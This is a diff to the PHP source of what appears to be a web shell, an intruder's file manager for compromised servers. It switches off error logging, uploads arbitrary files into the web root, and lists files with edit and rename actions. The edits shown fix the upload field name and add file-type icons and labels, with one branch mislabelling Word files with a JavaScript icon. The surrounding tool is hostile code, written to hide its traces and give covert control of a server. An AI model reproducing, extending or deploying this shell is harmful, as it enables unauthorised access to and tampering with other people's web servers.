@@ -4,7 +4,7 @@ set_time_limit(0);
 @error_reporting(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
-@ini_set('error_log', NULL);
+@ini_set('error_log', null);
 @ini_set('log_errors', 0);
 @ini_set('display_errors', 0);
 
@@ -257,8 +257,8 @@ function getfile($dir, $file, $label)
                $web = $_SERVER['HTTP_HOST'] . "/" . $_FILES['ecchifile']['name'];
 
                if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
-                  if (@copy($_FILES['file']['tmp_name'], $root)) {
-                     $act = "Uploaded! at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
+                  if (@copy($_FILES['ecchifile']['tmp_name'], $root)) {
+                     $act = "Uploaded! at <i><b>$root -> </b></i><a class='font-weight-bold' href='http://$web' target='_blank'>$web</a>";
                   } else {
                      $act = "failed to upload file";
                   }
@@ -598,8 +598,8 @@ function getfile($dir, $file, $label)
                               <i class="far fa-folder"></i>
                               <?= $href ?>
                            </td>
-                           <td class="border-dark"><?= $dtype ?></td>
-                           <td class="border-dark"><?= w("$dir/$direc", perms("$dir/$direc")) ?></td>
+                           <td class="border-dark text-center"><?= $dtype ?></td>
+                           <td class="border-dark text-center"><?= w("$dir/$direc", perms("$dir/$direc")) ?></td>
                            <td class="border-dark text-danger"><?= $act_dir ?></td>
                         </tr>
                   <?php
@@ -609,16 +609,53 @@ function getfile($dir, $file, $label)
                   echo "<p class='font-weight-bold text-danger'>can't open directory.</p>";
                }
                foreach ($scandir as $file) {
+                  $infoext = pathinfo($file);
                   $ftype = filetype("$dir/$file");
+                  if ($infoext['extension'] === 'php') {
+                     $i = '<i class="fab fa-php"></i>';
+                     $ftype = 'php';
+                  } else if ($infoext['extension'] == 'html') {
+                     $i = '<i class="fab fa-html5"></i>';
+                     $ftype = 'html';
+                  } else if ($infoext['extension'] == 'zip' || $infoext['extension'] == 'rar') {
+                     $i = '<i class="fas fa-file-archive"></i>';
+                     $ftype = ($infoext['extension'] == 'zip') ? 'zip' : 'rar';
+                  } else if ($infoext['extension'] == 'jpg' || $infoext['extension'] == 'jpeg' || $infoext['extension'] == 'png') {
+                     $i = '<i class="fas fa-file-image"></i>';
+                     $ftype = 'image';
+                  } else if ($infoext['extension'] == 'txt') {
+                     $i = '<i class="far fa-file-code"></i>';
+                     $ftype = 'txt';
+                  } else if ($infoext['extension'] == 'css') {
+                     $i = '<i class="fab fa-css3-alt"></i>';
+                     $ftype = 'css';
+                  } else if ($infoext['extension'] == 'js') {
+                     $i = '<i class="fab fa-js-square"></i>';
+                     $ftype = 'js';
+                  } else if ($infoext['extension'] == 'doc' || $infoext['extension'] == 'docx') {
+                     $i = '<i class="fab fa-js-square"></i>';
+                     $ftype = ($infoext['extension'] == 'doc') ? 'doc' : 'docx';
+                  } else if ($infoext['extension'] == 'pdf') {
+                     $i = '<i class="fas fa-file-pdf"></i>';
+                     $ftype = 'pdf';
+                  } else if ($infoext['extension'] == 'py') {
+                     $i = '<i class="fab fa-python"></i>';
+                     $ftype = 'python';
+                  } else if ($infoext['extension'] == 'mp4' || $infoext['extension'] == 'mp3') {
+                     $i = ($infoext['extension'] == 'mp4') ? '<i class="fas fa-file-video"></i>' : '<i class="fas fa-file-audio"></i>';
+                     $ftype = ($infoext['extension'] == 'mp4') ? 'video' : 'audio';
+                  } else {
+                     $i = '<i class="fas fa-file"></i>';
+                  }
                   if (!is_file("$dir/$file")) continue;
                   ?>
                   <tr>
                      <td class="border-dark">
-                        <i class="far fa-file-code"></i>
+                        <?= $i ?>
                         <a class="text-white" href="?act=view&dir=<?= "$dir&file=$dir/$file" ?>"><?= $file ?></a>
                      </td>
-                     <td class="border-dark"><?= $ftype ?></td>
-                     <td class="border-dark"><?= w("$dir/$file", perms("$dir/$file")) ?></td>
+                     <td class="border-dark text-center"><?= $ftype ?></td>
+                     <td class="border-dark text-center"><?= w("$dir/$file", perms("$dir/$file")) ?></td>
                      <td class="text-danger border-dark">
                         <a class="text-decoration-none text-dark" href="?act=edit&dir=<?= "$dir&file=$dir/$file" ?>">edit</a> |
                         <a class="text-decoration-none text-dark" href="?act=rename&dir=<?= "$dir&file=$dir/$file" ?>">rename</a> |
